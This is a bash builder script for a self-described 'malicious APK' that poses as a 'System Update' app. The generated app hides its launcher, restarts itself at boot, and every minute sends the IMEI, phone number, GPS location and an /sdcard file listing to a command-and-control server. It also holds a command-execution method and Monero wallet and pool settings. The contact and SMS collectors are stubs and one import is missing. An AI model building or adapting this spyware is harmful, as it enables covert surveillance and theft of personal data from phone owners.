#!/bin/bash
# Android Agent Builder
# Creates malicious APK with embedded C2 agent

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

C2_SERVER="${1:-http://127.0.0.1:5000}"
WALLET="${2:-44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5}"
POOL="${3:-pool.monero.hashvault.pro:443}"

echo -e "${YELLOW}[*] Building Android Agent${NC}"
echo -e "${YELLOW}[*] C2 Server: $C2_SERVER${NC}"

# Create project structure
PROJECT_DIR="/tmp/android_agent_$$"
mkdir -p "$PROJECT_DIR"/{app/src/main/{java/com/app,assets,res/{layout,values,drawable}},gradle/wrapper}

# AndroidManifest.xml
cat > "$PROJECT_DIR/app/src/main/AndroidManifest.xml" << 'MANIFEST_EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.update"
    android:versionCode="1"
    android:versionName="1.0">
    
    <!-- Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="System Update"
        android:theme="@style/Theme.AppCompat.NoActionBar">
        
        <!-- Main Activity (hidden) -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Boot Receiver -->
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
        
        <!-- Agent Service -->
        <service android:name=".AgentService" android:exported="false" />
        
    </application>
</manifest>
MANIFEST_EOF

# MainActivity.java
cat > "$PROJECT_DIR/app/src/main/java/com/app/MainActivity.java" << 'MAIN_EOF'
package com.system.update;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start agent service
        Intent serviceIntent = new Intent(this, AgentService.class);
        startService(serviceIntent);
        
        // Hide from recent apps
        finish();
    }
}
MAIN_EOF

# BootReceiver.java
cat > "$PROJECT_DIR/app/src/main/java/com/app/BootReceiver.java" << 'BOOT_EOF'
package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, AgentService.class);
            context.startService(serviceIntent);
        }
    }
}
BOOT_EOF

# AgentService.java
cat > "$PROJECT_DIR/app/src/main/java/com/app/AgentService.java" << 'AGENT_EOF'
package com.system.update;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class AgentService extends Service {
    private static final String C2_SERVER = "C2_SERVER_PLACEHOLDER";
    private static final String WALLET = "WALLET_PLACEHOLDER";
    private static final String POOL = "POOL_PLACEHOLDER";
    
    private String agentId;
    private Timer timer;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Generate agent ID
        agentId = generateAgentId();
        
        // Register with C2
        register();
        
        // Start periodic tasks
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                heartbeat();
                collectAndSend();
            }
        }, 0, 60000); // Every minute
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private String generateAgentId() {
        String deviceId = Settings.Secure.getString(
            getContentResolver(), 
            Settings.Secure.ANDROID_ID
        );
        return deviceId.substring(0, 16);
    }
    
    private JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            info.put("agent_id", agentId);
            info.put("platform", "android");
            info.put("device", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk", android.os.Build.VERSION.SDK_INT);
            info.put("carrier", tm.getNetworkOperatorName());
            info.put("country", tm.getNetworkCountryIso());
            info.put("phone_number", tm.getLine1Number());
            info.put("imei", tm.getDeviceId());
            
            // Location
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                info.put("lat", location.getLatitude());
                info.put("lon", location.getLongitude());
            }
            
        } catch (Exception e) {
            Log.e("Agent", "Error getting device info", e);
        }
        return info;
    }
    
    private void register() {
        try {
            JSONObject info = getDeviceInfo();
            sendPost("/api/agent/register", info);
        } catch (Exception e) {
            Log.e("Agent", "Registration failed", e);
        }
    }
    
    private void heartbeat() {
        try {
            sendPost("/api/agent/heartbeat", new JSONObject().put("agent_id", agentId));
        } catch (Exception e) {
            Log.e("Agent", "Heartbeat failed", e);
        }
    }
    
    private void collectAndSend() {
        try {
            JSONObject data = new JSONObject();
            data.put("agent_id", agentId);
            
            // Collect contacts
            data.put("contacts", collectContacts());
            
            // Collect SMS
            data.put("sms", collectSMS());
            
            // Collect location
            data.put("location", getLocation());
            
            // Collect files
            data.put("files", listFiles());
            
            sendPost("/api/agent/data", data);
        } catch (Exception e) {
            Log.e("Agent", "Collection failed", e);
        }
    }
    
    private JSONArray collectContacts() {
        JSONArray contacts = new JSONArray();
        // Would implement contact collection
        return contacts;
    }
    
    private JSONArray collectSMS() {
        JSONArray sms = new JSONArray();
        // Would implement SMS collection
        return sms;
    }
    
    private JSONObject getLocation() {
        JSONObject loc = new JSONObject();
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                loc.put("lat", location.getLatitude());
                loc.put("lon", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
            }
        } catch (Exception e) {}
        return loc;
    }
    
    private JSONArray listFiles() {
        JSONArray files = new JSONArray();
        try {
            java.io.File dir = new java.io.File("/sdcard");
            for (java.io.File f : dir.listFiles()) {
                JSONObject file = new JSONObject();
                file.put("name", f.getName());
                file.put("size", f.length());
                file.put("is_dir", f.isDirectory());
                files.put(file);
            }
        } catch (Exception e) {}
        return files;
    }
    
    private void sendPost(String endpoint, JSONObject data) {
        try {
            URL url = new URL(C2_SERVER + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();
            
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            Log.e("Agent", "HTTP request failed", e);
        }
    }
    
    private void executeCommand(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            Log.e("Agent", "Command execution failed", e);
        }
    }
}
AGENT_EOF

# Replace placeholders
sed -i "s|C2_SERVER_PLACEHOLDER|$C2_SERVER|g" "$PROJECT_DIR/app/src/main/java/com/app/AgentService.java"
sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" "$PROJECT_DIR/app/src/main/java/com/app/AgentService.java"
sed -i "s|POOL_PLACEHOLDER|$POOL|g" "$PROJECT_DIR/app/src/main/java/com/app/AgentService.java"

# build.gradle
cat > "$PROJECT_DIR/app/build.gradle" << 'GRADLE_EOF'
apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    buildToolsVersion "33.0.0"
    
    defaultConfig {
        applicationId "com.system.update"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
GRADLE_EOF

# strings.xml
cat > "$PROJECT_DIR/app/src/main/res/values/strings.xml" << 'STRINGS_EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
</resources>
STRINGS_EOF

# Create dummy icon
mkdir -p "$PROJECT_DIR/app/src/main/res/drawable"
echo -e "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00:~\x9b\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82" > "$PROJECT_DIR/app/src/main/res/drawable/ic_launcher.png"

echo -e "${GREEN}[+] Project structure created: $PROJECT_DIR${NC}"
echo -e "${YELLOW}[*] To build APK:${NC}"
echo -e "    cd $PROJECT_DIR"
echo -e "    gradle assembleRelease"
echo -e ""
echo -e "${YELLOW}[*] Or use Android Studio to import and build${NC}"

# Save project path
echo "$PROJECT_DIR" > /tmp/last_android_project.txt
